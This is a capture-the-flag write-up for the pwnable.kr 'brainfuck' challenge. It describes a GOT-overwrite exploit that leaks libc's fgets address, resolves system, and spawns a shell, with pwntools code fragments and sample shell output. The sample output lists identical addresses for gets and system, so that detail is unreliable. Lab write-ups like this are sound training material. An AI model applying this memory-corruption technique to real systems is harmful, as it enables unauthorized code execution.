# 🧠 Pwnable.kr - Brainfuck CTF Writeup

## 📌 Challenge Summary

* **Name**: brainfuck
* **Platform**: [pwnable.kr](http://pwnable.kr)
* **Category**: Exploitation / Pwn
* **Difficulty**: Medium

We’re given a custom Brainfuck interpreter binary that allows us to input brainfuck instructions, except `[` and `]`. Our goal is to get a shell.

---

## 🔍 Analysis

The binary disables loops (`[` and `]`), limiting traditional brainfuck control flow. But we still have access to `,` (input), `.` (output), `<`, and `>` to manipulate the tape, and can abuse memory writes with `,`.

### Observations:

* There is a static tape pointer at address `0x0804a0a0`
* We can leak memory with `.`
* We can write arbitrary data with `,`
* GOT entries for functions like `fgets`, `memset`, `putchar` are writable

We use this to:

1. Leak a libc address (fgets)
2. Calculate libc base
3. Overwrite a GOT entry with `system`
4. Send `/bin/sh` as input to get a shell

---

## 💥 Exploit Strategy

### Step 1: Leak `fgets` address

```python
pl = move(tape, plt["fgets"])
pl += read(4)
pl += write(4)
```

This reads the 4-byte pointer from `fgets@GOT` and writes it back so we can read it with `.`, leaking the libc address.

### Step 2: Overwrite GOT entries

```python
pl += move(plt["fgets"], plt["memset"])
pl += write(4)
pl += move(plt["memset"], plt["putchar"])
pl += write(4)
pl += '.'  # trigger output
```

### Step 3: Parse libc leak and calculate `system`

```python
fgets = int.from_bytes(r.recvn(4), byteorder = "little", signed = False)
libc_base = fgets - offset["fgets"]
gets = libc_base + offset["gets"]
system = libc_base + offset["system"]
```

We use pwntools' ELF parser to grab the offsets for `fgets`, `gets`, and `system`:

```python
libc = ELF("./bf_libc.so")
offset = {
    "fgets": libc.symbols[b"fgets"],
    "gets": libc.symbols[b"gets"],
    "system": libc.symbols[b"system"]
}
```

---

## 📦 Final Payload Staging

We send a second payload:

1. Inputs `/bin/sh\x00` into tape
2. Moves to `memset@got` and overwrites it with `system`
3. The next call to `memset("/bin/sh")` triggers a shell

---

## 🧪 Sample Output

```
fgets: 0xf7e45160
gets:  0xf7e463f0
system: 0xf7e463f0
$ whoami
brainfuck
$ cat flag
...
```

---

## 🧠 Takeaways

* Even without loops, brainfuck can be weaponized with GOT overwrites
* pwntools + ELF is powerful for automated libc resolving
* Tape offset calculations are key in memory corruption Brainfuck challenges

---

## 📁 Files

* `brainfuck_exploit.py` (main script)
* `bf_libc.so` (libc dump from remote)

---

## ✅ Status: Solved

* Shell achieved ✔️
* Flag captured ✔️
